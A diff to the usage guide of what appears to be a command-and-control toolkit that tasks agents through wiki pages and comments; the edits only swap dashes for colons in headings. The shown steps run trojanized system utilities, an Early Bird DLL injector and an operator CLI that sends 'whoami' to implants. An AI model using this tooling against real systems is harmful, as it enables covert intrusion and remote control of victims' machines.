@@ -113,19 +113,19 @@ copy build\*.dll payloads\
 
 ## Step 4: Execute the Caller
 
-### Payload 1 — Standalone
+### Payload 1 : Standalone
 
 ```
 payloads\caller.exe
 ```
 
-### Payload 2 — Trojanized QuickSysInfo
+### Payload 2 : Trojanized QuickSysInfo
 
 ```
 payloads\QuickSysInfo.exe
 ```
 
-### Payload 3 — Early Bird DLL Injection
+### Payload 3 : Early Bird DLL Injection
 
 Both files must be in the same directory:
 ```
@@ -133,7 +133,7 @@ cd payloads
 earlybird_inject.exe
 ```
 
-### Payload 4 — Trojanized QuickProcView
+### Payload 4 : Trojanized QuickProcView
 
 Both files must be in the same directory:
 ```
@@ -141,7 +141,7 @@ cd payloads
 QuickProcView.exe
 ```
 
-## Step 5: Operate — CLI or Web GUI
+## Step 5: Operate : CLI or Web GUI
 
 ### Option A: CLI Operator (`c2_operator.py`)
 
@@ -169,13 +169,13 @@ Open `http://127.0.0.1:8443` in your browser.
 
 ## Step 6: Send Commands
 
-### Via CLI — Page Body
+### Via CLI : Page Body
 
 ```
 python c2_operator.py --url ... --email ... --api-token ... --page-id 12345678 task 90bd7c8a "whoami"
 ```
 
-### Via CLI — Comment
+### Via CLI : Comment
 
 ```
 # Broadcast to all agents
